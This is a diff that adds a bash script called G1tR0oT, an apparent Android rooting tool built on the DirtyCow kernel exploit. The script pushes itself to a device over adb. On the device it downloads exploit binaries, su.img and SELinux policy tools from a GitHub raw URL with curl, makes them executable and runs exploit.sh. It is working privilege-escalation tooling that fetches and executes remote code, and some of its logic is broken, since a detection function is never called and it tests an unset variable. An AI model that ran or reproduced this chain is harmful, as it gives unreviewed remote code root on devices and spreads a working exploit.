@@ -1,0 +1,64 @@
+#!/bin/bash
+#=======================================================================
+#          FILE: G1tR0oT
+#         USAGE: ./G1tR0oT
+#        AUTHOR: j0nk0
+#        GITHUB: https://github.com/j0nk0/
+#          REPO: https://github.com/j0nk0/GetRoot-Android-DirtyCow
+#       CREATED: 10.10.2018
+#      REVISION: 0.0.3
+#=======================================================================
+WORK_DIR="$(cd $(dirname "$0"); pwd)"
+
+#Check if we are running on linux or android (Alternative: adb shell getprop ro.product.cpu.abilist)
+IS_ANDROID_(){
+#Is "uname" present?
+   type uname >/dev/null
+   if [ $? -eq 0 ] >/dev/null; then
+        if uname -m | grep "arm"; then
+         IS_ANDROID=1
+        elif uname -m | grep "x86" >/dev/null; then
+         IS_ANDROID=0
+        elif uname -m | grep "x86_64" >/dev/null; then
+         IS_ANDROID=0
+        fi
+   else
+   # If no "uname" present
+       if  cat /proc/cpuinfo | grep -i arm >/dev/null; then
+        IS_ANDROID=1
+       fi
+   fi
+
+   if [ -z $DISTRO ] >/dev/null; then
+       echo " [X] Error! Cannot detect arch! Assuming we arent running android"
+       IS_ANDROID="0"
+   fi
+}
+
+if [ $IS_ANDROID -eq 0 ] ; then
+    adb push "$0" /data/local/tmp
+    adb shell chmod 0777 /data/local/tmp/$(basename $0)
+    adb shell sh /data/local/tmp/$(basename $0)
+    exit
+fi
+
+if [ $IS_ANDROID -eq 1 ] ; then
+#Is "curl" present?
+   type curl >/dev/null
+    if ! [ $? -eq 0 ] >/dev/null; then
+        alias curl="/data/local/tmp/busybox curl"
+    fi
+    cd /data/local/tmp/
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/busybox -s -o busybox ; chmod 0777 busybox
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/exploit.sh -s -o exploit.sh ; chmod 0777 exploit.sh
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/libsupol.so -s -o libsupol.so
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/patch-init -s -o patch-init
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/readelf -s -o readelf
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/run-as-dirtycow -s -o run-as-dirtycow
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/run-as-dirtycow64 -s -o run-as-dirtycow64
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/su.img -s -o su.img
+    curl https://raw.githubusercontent.com/j0nk0/GetRoot-Android-DirtyCow/master/G1tR0oT_files/supolicy -s -o supolicy
+
+    ./exploit.sh
+    exit
+fi
